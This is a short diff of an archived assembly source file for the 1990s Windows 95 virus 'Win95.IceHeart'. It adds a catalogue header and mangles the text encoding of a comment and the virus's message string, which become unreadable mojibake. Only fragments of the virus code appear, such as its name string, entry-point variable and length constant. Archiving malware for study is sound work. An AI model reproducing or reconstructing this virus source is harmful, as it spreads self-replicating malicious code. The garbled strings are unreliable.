@@ -1,6 +1,17 @@
+; ------------------------------------------------------------
+; name      Legacy Win95
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ;last review 29.06.1999
 
-;"—?® ­? ??®­? - ??? «?¤..."
+;"ï¿½?ï¿½ ï¿½? ??ï¿½ï¿½? - ??? ï¿½?ï¿½..."
 ;Win95.IceHeart v1.5
 ;(c) 1998-xxxx Stainless Steel Rat /2Rats /RVA /IkX
 jumps
@@ -259,7 +270,7 @@ _Int21h:
 
 
 _Name	db 'Win95.iCE-hEART',0
-_Msg	db '? ? ?? , ? ???? ??§?¬­® «??«? !',0
+_Msg	db '? ? ?? , ? ???? ??ï¿½?ï¿½ï¿½ï¿½ ï¿½??ï¿½? !',0
 
 _old_eip      dd offset ExitProcess
 virlen equ $-offset start
